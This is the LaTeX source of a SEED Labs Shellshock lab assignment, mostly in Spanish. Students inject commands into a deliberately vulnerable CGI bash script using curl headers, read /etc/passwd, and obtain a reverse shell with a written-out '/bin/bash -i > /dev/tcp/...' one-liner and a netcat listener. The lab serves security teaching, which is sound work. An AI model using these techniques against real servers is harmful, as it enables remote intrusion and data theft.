%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  Copyright by Wenliang Du.                                       %%
%%  This work is licensed under the Creative Commons                %%
%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
%%  To view a copy of this license, visit                           %%
%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\newcommand{\commonfolder}{../../common-files}
\newcommand{\webcommon}{../Web_Common}

\documentclass[11pt]{article}

\usepackage[most]{tcolorbox}
\usepackage{times}
\usepackage{epsf}
\usepackage{epsfig}
\usepackage{amsmath, alltt, amssymb, xspace}
\usepackage{wrapfig}
\usepackage{fancyhdr}
\usepackage{url}
\usepackage{verbatim}
\usepackage{fancyvrb}
\usepackage{adjustbox}
\usepackage{listings}
\usepackage{color}
\usepackage{subfigure}
\usepackage{cite}
\usepackage{sidecap}
\usepackage{pifont}
\usepackage{mdframed}
\usepackage{textcomp}
\usepackage{enumitem}
\usepackage{hyperref}


% Horizontal alignment
\topmargin      -0.50in  % distance to headers
\oddsidemargin  0.0in
\evensidemargin 0.0in
\textwidth      6.5in
\textheight     8.9in 

\newcommand{\todo}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{TODO: #1}}
\vspace{0.1in}
}


\newcommand{\unix}{{\tt Unix}\xspace}
\newcommand{\linux}{{\tt Linux}\xspace}
\newcommand{\minix}{{\tt Minix}\xspace}
\newcommand{\ubuntu}{{\tt Ubuntu}\xspace}
\newcommand{\setuid}{{\tt Set-UID}\xspace}
\newcommand{\openssl} {\texttt{openssl}}


\pagestyle{fancy}
\lhead{\bfseries SEED Labs}
\chead{}
\rhead{\small \thepage}
\lfoot{}
\cfoot{}
\rfoot{}


\definecolor{dkgreen}{rgb}{0,0.6,0}
\definecolor{gray}{rgb}{0.5,0.5,0.5}
\definecolor{mauve}{rgb}{0.58,0,0.82}
\definecolor{lightgray}{gray}{0.90}


\lstset{%
  frame=none,
  language=,
  backgroundcolor=\color{lightgray},
  aboveskip=3mm,
  belowskip=3mm,
  showstringspaces=false,
%  columns=flexible,
  basicstyle={\small\ttfamily},
  numbers=none,
  numberstyle=\tiny\color{gray},
  keywordstyle=\color{blue},
  commentstyle=\color{dkgreen},
  stringstyle=\color{mauve},
  breaklines=true,
  breakatwhitespace=true,
  tabsize=3,
  columns=fullflexible,
  keepspaces=true,
  escapeinside={(*@}{@*)}
}

\newcommand{\newnote}[1]{
\vspace{0.1in}
\noindent
\fbox{\parbox{1.0\textwidth}{\textbf{Note:} #1}}
%\vspace{0.1in}
}


%% Submission
\newcommand{\seedsubmission}{
Debe enviar un informe de laboratorio detallado, con capturas de pantalla, para describir lo que ha hecho y lo que ha observado.
También debe proporcionar una explicación a las observaciones que sean interesantes o sorprendentes.
Enumere también los fragmentos de código más importantes seguidos de una explicación. No recibirán créditos aquellos fragmentos de códigos que no sean explicados.}

%% Book
\newcommand{\seedbook}{\textit{Computer \& Internet Security: A Hands-on Approach}, 2nd
Edition, by Wenliang Du. Para más detalles \url{https://www.handsonsecurity.net}.\xspace}

%% Videos
\newcommand{\seedisvideo}{\textit{Internet Security: A Hands-on Approach},
by Wenliang Du. Para más detalles \url{https://www.handsonsecurity.net/video.html}.\xspace}

\newcommand{\seedcsvideo}{\textit{Computer Security: A Hands-on Approach},
by Wenliang Du. Para más detalles \url{https://www.handsonsecurity.net/video.html}.\xspace}

%% Lab Environment
\newcommand{\seedenvironment}{Este laboratorio ha sido testeado en nuestra imagen pre-compilada de una VM con Ubuntu 16.04, que puede ser descargada del sitio oficial de SEED.\xspace}

\newcommand{\seedenvironmentA}{Este laboratorio ha sido testeado en nuestra imagen pre-compilada de una VM con Ubuntu 16.04, que puede ser descargada del sitio oficial de SEED.\xspace}

\newcommand{\seedenvironmentB}{Este laboratorio ha sido testeado en nuestra imagen pre-compilada de una VM con Ubuntu 20.04, que puede ser descargada del sitio oficial de SEED .\xspace}

\newcommand{\seedenvironmentC}{Este laboratorio ha sido testeado en nuestra imagen pre-compilada de una VM con Ubuntu 20.04, que puede ser descargada del sitio oficial de SEED. Sin embargo, la mayoría de nuestros laboratorios pueden ser realizados en la nube para esto Ud. puede leer nuestra guía que explica como crear una VM de SEED en la nube.\xspace}

\newcommand{\seedenvironmentAB}{
Este laboratorio ha sido testeado en nuestras imagenes pre-compiladas de una VM con Ubuntu 16.04 y otra con Ubuntu 20.04, que pueden ser descargadas del sitio oficial de SEED.\xspace}

\newcommand{\nodependency}{Dado que utilizamos contenedores para configurar el entorno de laboratorio, este laboratorio no depende estrictamente de la VM de SEED. Puede hacer este laboratorio utilizando otras máquinas virtuales, máquinas físicas o máquinas virtuales en la nube.\xspace}

\newcommand{\adddns}{You do need to add the required IP address mapping to
the \texttt{/etc/hosts} file.\xspace}






\newcommand{\seedlabcopyright}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{\small Copyright \copyright\ {#1}\ \ by Wenliang Du.\\
      Este trabajo se encuentra bajo licencia Creative Commons.
       Attribution-NonCommercial-ShareAlike 4.0 International License.
       Si ud. remezcla, transforma y construye a partir de este material,
       Este aviso de derechos de autor debe dejarse intacto o reproducirse de una manera que sea razonable para el medio en el que se vuelve a publicar el trabajo.
       }}
\vspace{0.1in}
}






\newcommand{\bash}{{\tt bash}\xspace}
\newcommand{\Bash}{{\tt Bash}\xspace}

\lhead{\bfseries SEED Labs -- Laboratorio de Shellshock}

\begin{document}

\begin{center}
{\LARGE Laboratorio de Shellshock}
\end{center}

\seedlabcopyright{2006 - 2016}

\section{Overview}

El 24 de Septiembre del 2014, una vulnerabilidad bastante severa fue identificada en la shell Bash. Esta vulnerabilidad fue llamada Shellshock, la misma podía ser explotada en muchos sistemas tanto de forma local como de forma remoota.
En este laboratorio, los estudiantes deberán de trabajar sobre este ataque y así entender la vulnerabilidad de Shellshock. 
El objetivo de este laboratorio es que los estudiantes puedan comprender como funciona y experimentar este tipo de ataque como así reflexionar sobre las lecciones que nos deja este ataque.
La primera versión de este laboratorio fue creada el 29 Septiembre del 2014, sólamente cinco días después que el ataque fue reportado. Este laboratorio fue asignado a estudiantes en nuestra clase de Computer Security el 30 de Septiembre del 2014.
Una misión importante del proyecto SEED es convertir rápidamente ataques reales en material educativo, con el objetivo de que los instructores puedan llevar este material en sus clases en tiempo y forma, manteniendo a sus alumnos actualizados sobre los ataques/vulnerabilidades que ocurren en el mundo real. 

Este laboratorio cubre los siguientes tópicos:

\begin{itemize}[noitemsep]
\item Shellshock
\item Variables de Entorno
\item Definición de Funciones en Bash
\item Programas CGI y Apache
\end{itemize}


\paragraph{Lecturas y Videos.}
Para una cobertura más detallada sobre el ataque de Shellshock puede consultar:
\begin{itemize}
\item Capítulo 3 del libro de SEED, \seedbook
\item Sección 3 del curso de SEED en Udemy, \seedcsvideo
\end{itemize}


\paragraph{Entorno de Laboratorio.} \seedenvironmentB \nodependency



% *******************************************
% SECTION
% *******************************************
\section{Configuración del Entorno de Laboratorio} 



% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Configuración DNS}

En nuestro setup hemos configurado el contenedor del Servidor Web en la IP \texttt{10.9.0.5}. El hostname del servidor se llama \texttt{www.seed-server.com}.
Necesitamos mapear este nombre de dominio su IP. Para ello deberá agregar la siguiente entradasen el archivo \texttt{/etc/hosts}.
Para poder modificar este archivo ud. debe contar con privilegios de root:

\begin{lstlisting}
10.9.0.5       www.seed-server.com
\end{lstlisting}
 
% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Setup del Contenedor y sus Comandos}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
Para empezar a preparar el contenedor, deberá descargarse el archivo \texttt{Labsetup.zip} ubicado en el laboratorio correspondiente dentro del sitio web oficial y copiarlo dentro de la Máquina Virtual prevista por SEED. Una vez descargado deberá descomprimirlo y entrar dentro del directorio \texttt{Labsetup} donde encontrará el archivo \texttt{docker-compose.yml} que servirá para setear el entorno de laboratorio. Para una información más detallada sobre el archivo \texttt{Dockerfile} y otros archivos relacionados, puede encontrarla dentro del Manual de Usuario del laboratorio en uso, en el sitio web oficial de SEED.

Si esta es su primera experiencia haciendo el setup del laboratorio usando contenedores es recomendable que lea el manual anteriormente mencionado.

A continuación, se muestran los comandos más usados en Docker y Compose.
Debido a que estos comandos serán usados con mucha frecuencia, hemos creados un conjunto de alias para los mismos, ubicados en del archivo \texttt{.bashrc} dentro de la Máquina Virtual provista por SEED (Ubuntu 20.04)

\begin{lstlisting}
$ docker-compose build  # Build the container image
$ docker-compose up     # Start the container
$ docker-compose down   # Shut down the container

// Aliases for the Compose commands above
$ dcbuild       # Alias for: docker-compose build
$ dcup          # Alias for: docker-compose up
$ dcdown        # Alias for: docker-compose down
\end{lstlisting}


Dado que todos los contenedores estarán corriendo en un segundo plano. Necesitamos correr comandos para interactuar con los mismos, una de las operaciones fundamentales es obtener una shell en el contenedor. 
Para este propósito usaremos \texttt{"docker ps"} para encontrar el ID del contenedor deseado y ingresaremos \texttt{"docker exec"} para correr una shell en ese contenedor.
Hemos creado un alias para ello dentro del archivo \texttt{.bashrc}

\begin{lstlisting}
$ dockps        // Alias for: docker ps --format "{{.ID}}  {{.Names}}" 
$ docksh <id>   // Alias for: docker exec -it <id> /bin/bash

// The following example shows how to get a shell inside hostC
$ dockps
b1004832e275  hostA-10.9.0.5
0af4ea7a3e2e  hostB-10.9.0.6
9652715c8e0a  hostC-10.9.0.7

$ docksh 96
root@9652715c8e0a:/#  

// Note: If a docker command requires a container ID, you do not need to 
//       type the entire ID string. Typing the first few characters will 
//       be sufficient, as long as they are unique among all the containers. 
\end{lstlisting}

En caso de problemas configurando el entorno, por favor consulte la sección ``Common Problems'' en el manual ofrecido por SEED. 


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


% -------------------------------------------
% SUBSECTION
% -------------------------------------------
\subsection{Servidor Web y CGI}

En este laboratorio, lanzaremos un ataque Shellshock sobre el contenedor del Servidor Web. Muchos Servidores Web tienen activado CGI, que es un método standard 
que se usa en páginas web para generar contenido para los aplicativos que corren estás páginas. Muchos programas CGI son scripts shell, por lo que antes que se corra el programa CGI, un programa shell será invocado primero y esta invocación está dada por la interacción de usuarios externos al sistema. Si el programa shell es un script en bash vulnerable, podemos explotar la vulnerabilidad de Shellshock para obtener privilegios en el servidor.

En nuestro contenedor que contiene el servidor web, hemos creado un programa CGI muy simple (llamado \texttt{vul.cgi}). 
Este programa solamente imprimirá el mensaje {\tt "Hello World"} usando un script shell.
El programa CGI está dentro del directorio default donde Apache guarda los programas CGI \texttt{/usr/lib/cgi-bin} y debe ser ejecutable.

\begin{lstlisting}[caption=\texttt{vul.cgi}] 
(*@\textbf{\#!/bin/bash\_shellshock}@*)          

echo "Content-type: text/plain"
echo
echo
echo "Hello World"
\end{lstlisting}

Este programa CGI usa \texttt{/bin/bash\_shellshock} (primera línea), en vez de usar \texttt{/bin/bash}. Esta línea especifíca que tipo de shell será invocada cuando se corra el script. Necesitamos usar la versión vulnerable de Bash en este laboratorio.

Para acceder al programa CGI desde la web, podemos usar un navegador tipeando la siguiente URL: \url{http://www.seed-server.com/cgi-bin/vul.cgi}, o usar el  comando {\tt curl} en la shell, ambos hacen lo mismo. Por favor asegúrese que el contenedor esté corriendo.


\begin{lstlisting}
$ curl http://www.seed-server.com/cgi-bin/vul.cgi
\end{lstlisting}


% *******************************************
% SECTION
% ******************************************* 
\section{Tareas del Laboratorio}

Para más detalles sobre el ataque Shellshock puede consultar el libro de SEED, no repetiremos las guías en este laboratorio.

% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Tarea 1: Experimentando con Funciones en Bash}

La versión de Bash en Ubuntu 20.04 ha sido corregida, por lo que no es vulnerable al ataque de Shellshock. A fines de poder realizar este ataque hemos instalado la versión vulnerable de Bash dentro del contenedor (en el directorio  \texttt{/bin}). 
Este programa puede ser obtenido en el directorio \texttt{Labsetup} (dentro de \texttt{image\_www}). 
El nombre de este programa es \texttt{bash\_shellshock}. necesitamos usar este Bash para nuestra tarea. Puede correr esta shell tanto dentro del contenedor como en su computadora.
El manual del contenedor está en el sitio oficial del laboratorio.

Por favor diseñe un experimento para verificar si esta versión de Bash es vulnerable o no al ataque de Shellshock. Haga lo mismo con la versión parcheada de \texttt{/bin/bash} y reporte sus observaciones.


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Tarea 2: Enviando datos a Bash por medio de Variables de Entorno}


To exploit a Shellshock vulnerability in a bash-based CGI program, attackers need to 
pass their data to the vulnerable bash program, and the data need to be
passed via an environment variable. In this task, we need to see how we can
achieve this goal. We have provided another CGI program (\texttt{getenv.cgi}) on the 
server to help you identify what user data can get into the environment
variables of a CGI program. This CGI program prints out all
its environment variables. 


\begin{lstlisting}[caption=\texttt{getenv.cgi}]
#!/bin/bash_shellshock             

echo "Content-type: text/plain"
echo
echo "****** Environment Variables ******"
strings /proc/$$/environ            (*@\ding{192}@*)
\end{lstlisting}

\paragraph{Tarea 2.A: Using brower.}
In the code above, Line \ding{192} prints out the contents of all the
environment variables in the current process. Normally, you would see something 
like the following if you use a browser to access the CGI program. Please 
identify which environment variable(s)' values are set by the browser.
You can turn on the HTTP Header Live extension on your browser to 
capture the HTTP request, and compare the request with the 
environment variables printed out by the server. Please include your 
investigation results in the lab report.

\begin{lstlisting}
****** Environment Variables ******
HTTP_HOST=www.seed-server.com
HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) ...
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9, ...
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_ACCEPT_ENCODING=gzip, deflate
...
\end{lstlisting}

 
\paragraph{Tarea 2.A: Using \texttt{curl}}
If we want to set the environment variable data to arbitrary values,
we will have to modify the behavior of the browser, that will be too complicated. 
Fortunately, there is a command-line tool called \texttt{curl}, which allows 
users to to control most of fields in an HTTP request. Here are some 
of the userful options: (1) the \texttt{-v} field can print out the header 
of the HTTP request; (2) the \texttt{-A}, \texttt{-e}, and 
\texttt{-H} options can set some fields in the header request, and
you need to figure out what fileds are set by each of them. 
Please include your findings in the lab report. 
Here are the examples on how to use these fields:
 

\begin{lstlisting}
$ curl -v www.seed-server.com/cgi-bin/getenv.cgi
$ curl -A "my data" -v www.seed-server.com/cgi-bin/getenv.cgi
$ curl -e "my data" -v www.seed-server.com/cgi-bin/getenv.cgi
$ curl -H "AAAAAA: BBBBBB" -v www.seed-server.com/cgi-bin/getenv.cgi
\end{lstlisting}
 
Based on this experiment, please describe what options of \texttt{curl} 
can be used to inject data into the environment variables of 
the target CGI program. 


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Tarea 3: Lanzando el Ataque de Shellshock}

We can now launch the Shellshock attack. 
The attack does not depend on what is in the CGI program, as it targets
the bash program, which is invoked before the actual CGI script is
executed. Your job is to launch the attack through the URL
\url{http://www.seed-server.com/cgi-bin/vul.cgi}, so you can
get the server to run an arbitrary command. 


If your command has a plain-text output, and you want the output returned to you,
your output needs to follow a protocol: it should start with 
\texttt{Content\_type: text/plain}, followed by an empty line, and then
you can place your plain-text output. For example, if you want the
server to return a list of files in its folder, your command  
will look like the following: 

\begin{lstlisting}
echo Content_type: text/plain; echo; /bin/ls -l
\end{lstlisting}
 

In this task, please use three different approaches (i.e., three different HTTP header fields)
to launch the Shellshock attack against the target CGI program. You need to achieve 
the following objectives. For each objective, you only need to use one approach,
but in total, you need to use three different approaches. 

\begin{itemize}
\item Tarea 3.A: Get the server to send back the content of the \texttt{/etc/passwd} file. 

\item Tarea 3.B: Get the server to tell you its process' user ID. You can use 
the \texttt{/bin/id} command to print out the ID information. 

\item Tarea 3.C: Get the server to create a file inside the \texttt{/tmp} folder. You need to 
get into the container to see whether the file is created or not, or use 
another Shellshock attack to list the \texttt{/tmp} folder.

\item Tarea 3.D: Get the server to delete the file that you just created 
inside the \texttt{/tmp} folder. 
\end{itemize} 


\paragraph{Preguntas.} Please answer the following questions:
\begin{itemize}
\item Question 1: Will you be able to steal the content of 
the shadow file \texttt{/etc/shadow} from the server? Why or why not?  
The information obtained in Task 3.B should give you a clue. 

\item Question 2: HTTP GET requests typically attach data in the URL, 
after the \texttt{?} mark. This could be another 
approach that we can use to launch the attack. In the following example,
we attach some data in the URL, and we found that the data are used to set
the following environment variable: 

\begin{lstlisting}
$ curl "http://www.seed-server.com/cgi-bin/getenv.cgi?AAAAA"
...
QUERY_STRING=AAAAA
...
\end{lstlisting}

Can we use this method to launch the Shellshock attack? Please conduct your 
experiment and derive your conclusions based on your experiment results. 
     
\end{itemize}

  


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Tarea 4: Obteniendo una shell reversa a través del ataque de Shellshock }

The Shellshock vulnerability allows attacks to run arbitrary commands on
the target machine. In real attacks, instead of hard-coding the command 
in the attack, attackers often choose to run a shell
command, so they can use this shell to run other commands,
for as long as the shell program is alive. 
To achieve this goal, attackers need to run a reverse shell.

Reverse shell is a shell process started on a machine, with its input and output being
controlled by somebody from a remote computer. Basically, the shell runs
on the victim's machine, but it takes input from the attacker machine and
also prints its output on the attacker's machine. Reverse shell
gives attackers a convenient way to run commands on a compromised machine. 
Detailed explanation of how to create a reverse shell can be found in 
the SEED book. We also summarize the explanation in
Section~\ref{shellshock:sec:reverseshell}.
In this task, you need to demonstrate 
how you can get a reverse shell from the victim using the Shellshock attack. 


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Tarea 5: Usando la versión Parcheada de Bash}

Now, let us use a bash program that has already been patched.
The program \texttt{/bin/bash} is a patched version.
Please replace the first line of 
the CGI programs with this program. 
Redo Task 3 and describe your observations. 


% *******************************************
% SECTION
% ******************************************* 
\section{Guías: Creando una Shell Reversa}
\label{shellshock:sec:reverseshell}



%\section{Guidelines: Creating Reverse Shell}
%\label{shellshock:sec:reverseshell}

La idea principal de una shell reversa es poder redirigir los dispositivos de standard input, output y error hacia una conexión de red, pudiendo así enviar y recibir información a través de este canal por la shell. En la otra punta de la conexión estará la máquina del atacante corriendo un programa mostrando lo que venga de la shell del otro lado de la conexión, al mismo tiempo este programa enviará lo que el atacante escriba usando la misma conexión de red.

Uno de los programas más usados por los atacantes para este propósito es \texttt{netcat}, si se corre con el parámetro \texttt{"-l"}, este se pondrá a la escucha de un puerto TCP en un puerto específico, convirtiéndose en un servidor TCP. Este servidor bastante simple hecho con netcat, imprimirá lo que llegue lo que se envie por un cliente y enviará lo que el usuario corriendo el servidor escriba.
En el siguiente experimento usaremos  \texttt{netcat} para ponernos a la escucha en el puerto TCP \texttt{9090} simulando ser un servidor TCP.

\begin{lstlisting}
Attacker(10.0.2.6):$ nc -nv -l 9090  (*@\reflectbox{\ding{217}} \textbf{Waiting for reverse shell}@*)
Listening on 0.0.0.0 9090
Connection received on 10.0.2.5 39452
Server(10.0.2.5):$     (*@\reflectbox{\ding{217}} \textbf{Reverse shell from 10.0.2.5.}@*)
Server(10.0.2.5):$ ifconfig
ifconfig
enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet (*@\textbf{10.0.2.5}@*)  netmask 255.255.255.0  broadcast 10.0.2.255
        ...
\end{lstlisting}

El comando \texttt{nc} mostrado arriba, se pondrá a la escucha en el puerto TCP 9090 y se bloqueará en espera de nuevas conexiones.
A continuación con el fin de emular lo que haría un atacante después de comprometer el servidor por medio del ataque de Shellshock, debemos de correr el programa bash mostrado más abajo en el servidor cuya dirección IP es (\texttt{10.0.2.5}).
Este programa lanzará una conexión TCP en el puerto 9090 hacia la máquina del atacante, otorgándole así una shell reversa. Podremos observar el prompt shell que nos indica que la shell está corriendo en el servidor; podemos usar el comando \texttt{ifconfig} para verificar que la dirección IP es la correcta (\texttt{10.0.2.5}) y que es la que pertenece a la máquina que hostea el servidor. A continuación se muestra la sentencia de bash que debe ser ejecutada:

\begin{lstlisting}
Server(10.0.2.5):$ /bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1
\end{lstlisting}

Este comando normalmente es ejecutado por un atacante en un servidor comprometido.
Es un tanto engorroso, en los siguientes parráfos darémos una explicación detallada de su funcionamiento. 


\begin{itemize}

\item \texttt{"/bin/bash -i"}: El parámetro \texttt{i} es quiere decir que la shell será una shell interactiva, esto significa que nos permitirá interactuar para enviar y recibir información usando la shell.

\item \texttt{"> /dev/tcp/10.0.2.6/9090"}: Esto hace que el (\texttt{stdout}) (standard output) de la shell sea redirigido hacia la conexión TCP establecida con la IP del atacante \texttt{10.0.2.6} en el puerto \texttt{stdout} es el  \texttt{9090}. En sistemas \unix, el número del descriptor de archivo (file descriptor) del \texttt{stdout} es el \texttt{1}

\item \texttt{"0<\&1"}: El descriptor de archivo (file descriptor) cuyo número es \texttt{0} representa el standard input (\texttt{stdin}). Esta opción le indica al sistema que use el standard output como standard input.
Dado que el \texttt{stdout} está siendo redirigido hacia una conexión TCP, esta opción le indica al programa shell que obtendrá su entrada usando la misma conexión.

\item \texttt{"2>\&1"}: El descriptor de archivo (file descriptor) cuyo número es cuyo número es \texttt{2} representa el standard error \texttt{stderr}.
Esto hace que cualquier error que pueda ocurrir sea redirigido al \texttt{stdout} que es la conexión TCP.

\end{itemize}

Para concluir, el comando  \texttt{"/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<\&1 2>\&1"}  ejecuta una shell \texttt{bash} en la máquina del servidor cuyo input viene de una conexión TCP y su output sale por la misma conexión TCP.
En nuestro experimento al ejecutar la shell \texttt{bash} en el servidor \texttt{10.0.2.5} este establecerá una conexión reversa hacia  \texttt{10.0.2.6}. Esto puede ser verificado por medio del mensaje \texttt{"Connection from 10.0.2.5 ..."} mostrado en \texttt{netcat}.








% *******************************************
% SECTION
% ******************************************* 
\section{Informe del Laboratorio}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

Debe enviar un informe de laboratorio detallado, con capturas de pantalla, para describir lo que ha hecho y lo que ha observado.
También debe proporcionar una explicación a las observaciones que sean interesantes o sorprendentes.
Enumere también los fragmentos de código más importantes seguidos de una explicación. No recibirán créditos aquellos fragmentos de códigos que no sean explicados.

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

% *******************************************
% SECTION
% *******************************************
\section*{Agradecimientos}

Este documento ha sido traducido al Español por Facundo Fontana


\end{document}

